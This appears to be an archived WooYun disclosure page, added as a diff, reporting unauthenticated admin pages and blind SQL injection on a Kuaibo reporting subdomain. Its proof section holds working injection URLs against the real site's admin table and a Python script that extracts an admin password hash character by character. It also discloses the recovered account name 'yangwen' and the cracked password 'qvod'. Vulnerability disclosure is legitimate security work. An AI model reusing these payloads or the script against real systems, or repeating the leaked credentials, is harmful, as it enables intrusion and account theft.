@@ -1,0 +1,235 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		快播子网站(举报不良内容)存在SQL注入，信息泄漏  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		快播子网站(举报不良内容)存在SQL注入，信息泄漏  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/asmc">asmc</a> 
+</li><li>提交时间：		2012-10-03 10:30</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-03：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-11-17：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">后台验证不严格，存在SQL注入,信息泄漏</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1 后台搜索功能缺少验证可直接访问:<br />
+<br />
+http://badrpt.kuaibo.com/report/search<br />
+<br />
+http://badrpt.kuaibo.com/report/lists<br />
+<br />
+http://badrpt.kuaibo.com/report/edit<br />
+<br />
+http://badrpt.kuaibo.com/report/put<br />
+<br />
+http://badrpt.kuaibo.com/report/del<br />
+<br />
+<br />
+<br />
+2 其中http://badrpt.kuaibo.com/report/lists,可以查看其他用户的邮箱地址和IP<br />
+<br />
+但是要通过burp suite才能看到，因为这些功能也是做了验证的权限的，但是已经失效，而且没有对验证失败做合适处理，所以代码中查看其他用户信息的内容还是可以查看到<br />
+<br />
+最直接查看用户信息的地址是：<br />
+<br />
+http://badrpt.kuaibo.com/report/search/0/0/2<br />
+<br />
+</p><p class="detail"><a href="../images/020718367611e7110cdd097316ff978ea8f33e2e.jpg" target="_blank"><img src="../images/020718367611e7110cdd097316ff978ea8f33e2e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3 通过以上发现在http://badrpt.kuaibo.com/report/search/0/0/2，“2”这个位置有SQL注入点，是MYSQL库 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">由于没有错误提示，所以要手工猜测表名和字段名，还好是常用的<br />
+<br />
+http://badrpt.kuaibo.com/report/search/0/0/2%20and%201=2%20union%20select%201,2,3,user_pwd,5,6,7,8,9,10,11,12,13,14,15,16%20from%20admin_users%20where%20length(user_name)=6%20and%20ascii(substring(user_name,1,1))=107--<br />
+<br />
+http://badrpt.kuaibo.com/report/search/0/0/2%20and%201=2%20union%20select%201,2,3,user_pwd,5,6,7,8,9,10,11,12,13,14,15,16%20from%20admin_users%20where%20length(user_name)=6%20and%20ascii(substring(user_name,4,1))=105--<br />
+<br />
+<br />
+<br />
+从第一个和第四个位置，以及目标网站的名字，大概可以猜测出这个6位长的用户名是kuaibo,<br />
+<br />
+<br />
+<br />
+http://badrpt.kuaibo.com/report/search/0/0/2%20and%201=2%20union%20select%201,2,3,user_pwd,5,6,7,8,9,10,11,12,13,14,15,16%20from%20admin_users%20where%20user_name=&#039;kuaibo&#039;%20and%20length(user_pwd)%3E32--<br />
+<br />
+<br />
+<br />
+判断该用户的密码长度是32，应该是MD5加密的了，到这里得写个程序了，不然得累死<br />
+<br />
+</p><pre><code>#!/usr/bin/python<br />
+# its a POC, please use responsibly<br />
+<br />
+import string,urllib<br />
+import sys,re<br />
+<br />
+host = &quot;http://badrpt.kuaibo.com/report/search/0/0/2&quot;<br />
+NUM = {&quot;NUM1&quot;:&quot;1&quot;, &quot;NUM2&quot;:&quot;48&quot;}<br />
+MD5STR = (&#039;0&#039;,&#039;1&#039;,&#039;2&#039;,&#039;3&#039;,&#039;4&#039;,&#039;5&#039;,&#039;6&#039;,&#039;7&#039;,&#039;8&#039;,&#039;9&#039;,&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;)<br />
+pass_len = 32<br />
+<br />
+text_pwd = []<br />
+<br />
+for i in range(1,33):<br />
+	NUM[&#039;NUM1&#039;] = i<br />
+	print &quot;[try] crack %d pos:&quot;%(i),<br />
+	for md5ascii in (MD5STR):<br />
+		NUM[&#039;NUM2&#039;] = ord(md5ascii)<br />
+		SQL_Path = &quot;%20and%201=2%20union%20select%201,2,3,user_pwd,5,6,7,8,9,10,11,12,13,14,15,16%20from%20admin_users%20where%20user_name=&#039;yangwen&#039;%20and%20ascii(substring(user_pwd,&quot;+str(NUM[&#039;NUM1&#039;])+&quot;,1))=&quot;+str(NUM[&#039;NUM2&#039;])+&quot;--&quot;<br />
+		#print &quot;debug %s&quot;%(host+SQL_Path)<br />
+		response = urllib.urlopen(host+SQL_Path).read()<br />
+		findall_hashs = re.compile(&quot;1970-01-01&quot;).findall<br />
+		found_pwdchar = findall_hashs(response)<br />
+		if len(found_pwdchar) != 0:<br />
+			print md5ascii<br />
+			text_pwd.append(md5ascii)<br />
+			break<br />
+		<br />
+print &quot;[Ok] Password is %s&quot;%(&#039;&#039;.join(text_pwd))</code></pre><p class='detail'><br />
+<br />
+结果：<br />
+<br />
+</p><p class="detail"><a href="../images/02072702503178785c92847a2dd266294fe6ee99.jpg" target="_blank"><img src="../images/02072702503178785c92847a2dd266294fe6ee99.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+拿到CMD5没有破解出来，不错的密码:)<br />
+<br />
+<br />
+<br />
+试试下一个用户: yangwen (用户名毕竟短小精悍，手工就得到:)<br />
+<br />
+</p><p class="detail"><a href="../images/02072918d53ab4142e7e3aae66ece9c2cc1a4ff5.jpg" target="_blank"><img src="../images/02072918d53ab4142e7e3aae66ece9c2cc1a4ff5.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+从CMD5破解得到的密码是:qvod <br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">验证后台页面, 过滤SQL注入字符， </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/asmc" title="asmc">asmc</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-012979" title="快播子网站(举报不良内容)存在SQL注入，信息泄漏">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="12979";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
